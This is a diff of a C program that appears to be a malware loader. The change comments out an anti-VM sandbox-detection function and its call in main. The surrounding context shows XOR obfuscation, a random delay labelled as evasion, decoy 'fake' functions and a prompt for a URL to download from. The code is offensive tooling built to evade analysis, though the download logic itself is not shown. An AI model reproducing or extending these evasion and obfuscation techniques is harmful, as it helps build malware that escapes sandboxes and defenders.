@@ -29,17 +29,17 @@ void xor_encrypt(char* data, int length) {
     }
 }
 
-// Anti-VM check (basic detection for VM environment)
-int check_for_vm() {
-    SYSTEM_INFO sysInfo;
-    GetSystemInfo(&sysInfo);
+// // Anti-VM check (basic detection for VM environment)
+// int check_for_vm() {
+//     SYSTEM_INFO sysInfo;
+//     GetSystemInfo(&sysInfo);
 
-    if (sysInfo.dwProcessorType == PROCESSOR_ARCHITECTURE_INTEL) {
-        return 0; // Not a VM (simple example, you'd need more checks here)
-    }
+//     if (sysInfo.dwProcessorType == PROCESSOR_ARCHITECTURE_INTEL) {
+//         return 0; // Not a VM (simple example, you'd need more checks here)
+//     }
     
-    return 1; // Potential VM environment detected
-}
+//     return 1; // Potential VM environment detected
+// }
 
 // Function to simulate random delay (for evasion)
 void simulate_delay() {
@@ -69,10 +69,10 @@ int main() {
     fake_function_2();
 
     // Anti-VM Check
-    if (check_for_vm()) {
-        printf("VM detected, aborting...\n");
-        return 1;
-    }
+    // if (check_for_vm()) {
+    //     printf("VM detected, aborting...\n");
+    //     return 1;
+    // }
 
     printf("Enter URL to download from (or leave blank for default): ");
     fgets(url, sizeof(url), stdin);
